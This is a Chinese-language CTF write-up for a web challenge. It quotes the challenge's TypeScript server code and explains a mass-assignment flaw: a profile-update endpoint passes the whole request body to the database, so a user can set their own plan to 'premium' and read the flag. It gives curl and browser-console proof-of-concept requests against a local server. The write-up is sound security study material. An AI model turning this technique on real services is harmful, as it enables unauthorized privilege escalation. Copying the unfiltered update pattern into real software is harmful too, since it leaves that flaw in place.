# Z Writeup

## 题目信息

- 比赛：未注明
- 题目名：Z
- 类型：Web
- Flag 格式：CPCTF{...}

## Flag

- Flag 值：已隐藏

## 状态

- 状态：已完成
## 题目分析

先看拿 flag 的条件：

- `GET /api/flag` 需要已登录。
- 当前用户的 `plan` 必须等于 `"premium"`。

对应后端逻辑在题目附件源码 `server/src/index.ts`：

```ts
app.get("/api/flag", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);
  if (user.plan !== "premium") {
    return c.json({ error: "Premium required" }, 403);
  }

  return c.json({ flag: process.env.FLAG || "CPCTF{dummy}" });
});
```

数据库中 `users` 表确实存在 `plan` 字段，默认值为 `free`：

```ts
export const users = sqliteTable("users", {
  id: integer("id").primaryKey({ autoIncrement: true }),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  displayName: text("display_name").notNull(),
  bio: text("bio").notNull().default(""),
  plan: text("plan").notNull().default("free"),
});
```

正常升级入口是 `POST /api/upgrade`，但题目里写死了永远失败：

```ts
app.post("/api/upgrade", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);

  return c.json(
    { error: "Payment failed. Please check your card details." },
    402,
  );
});
```

所以正常流程不可能变成 `premium`，突破点一定在别的接口。

## 漏洞点

关键在个人资料更新接口 `PUT /api/me`：

```ts
type ProfileUpdate = {
  displayName: string;
  bio: string;
};

function updateProfile(id: number, data: ProfileUpdate) {
  db.update(users).set(data).where(eq(users.id, id)).run();
}

app.put("/api/me", async (c) => {
  const user = await getUser(c);
  if (!user) return c.json({ error: "Unauthorized" }, 401);

  const body: ProfileUpdate = await c.req.json();

  try {
    updateProfile(user.id, body);
  } catch {
    return c.json({ error: "Update failed" }, 400);
  }
  ...
});
```

问题在于：

- `ProfileUpdate` 只是 TypeScript 类型。
- TypeScript 类型只在编译期生效，运行时不会自动过滤字段。
- 服务端没有对白名单字段做校验。
- `db.update(users).set(data)` 会把请求体中可映射到 `users` 表字段的内容一起更新。

也就是说，我们虽然“表面上”只能改 `displayName` 和 `bio`，但实际上可以额外提交：

```json
{
  "displayName": "test",
  "bio": "test",
  "plan": "premium"
}
```

这样就能把自己的 `plan` 从 `free` 越权改成 `premium`。

这本质上是一个典型的 Mass Assignment / 字段白名单缺失导致的越权更新。

## 利用流程

### 1. 注册并登录

注册后服务端会通过 cookie 下发登录态：

```http
POST /api/register
Content-Type: application/json

{"username":"aaa","password":"aaa"}
```

### 2. 越权修改自己的 plan

直接请求：

```http
PUT /api/me
Content-Type: application/json
Cookie: token=...

{
  "displayName": "aaa",
  "bio": "pwned",
  "plan": "premium"
}
```

如果成功，返回的数据里就会看到：

```json
{
  "id": 1,
  "username": "aaa",
  "displayName": "aaa",
  "bio": "pwned",
  "plan": "premium"
}
```

### 3. 读取 flag

此时再访问：

```http
GET /api/flag
Cookie: token=...
```

即可拿到 flag。

## PoC

### curl 版

先注册并保存 cookie：

```bash
curl -i -c cookie.txt \
  -X POST http://127.0.0.1:8080/api/register \
  -H 'Content-Type: application/json' \
  --data '{"username":"aaa","password":"aaa"}'
```

再把自己改成 premium：

```bash
curl -b cookie.txt \
  -X PUT http://127.0.0.1:8080/api/me \
  -H 'Content-Type: application/json' \
  --data '{"displayName":"aaa","bio":"pwned","plan":"premium"}'
```

最后读 flag：

```bash
curl -b cookie.txt http://127.0.0.1:8080/api/flag
```

### 浏览器控制台版

如果已经登录，可以直接在浏览器控制台执行：

```js
await fetch("/api/me", {
  method: "PUT",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({
    displayName: "aaa",
    bio: "pwned",
    plan: "premium",
  }),
}).then((r) => r.json());

await fetch("/api/flag").then((r) => r.json());
```

## 漏洞成因总结

这题的核心不是支付绕过，也不是 JWT，而是后端把“前端应该传什么”误当成了“后端实际只会收到什么”。

前端页面里确实只提供了 `displayName` 和 `bio` 两个输入框，但攻击者完全可以自己构造请求。只要服务端没有做运行时字段校验，额外的 `plan` 字段就能被带进数据库更新逻辑里，最终导致越权拿到 `premium` 身份和 flag。

## 最终利用链

1. 注册普通用户。
2. 调用 `PUT /api/me` 时额外传入 `plan: "premium"`。
3. 服务端把 `plan` 一起写入数据库。
4. 再请求 `GET /api/flag`，成功得到 flag。
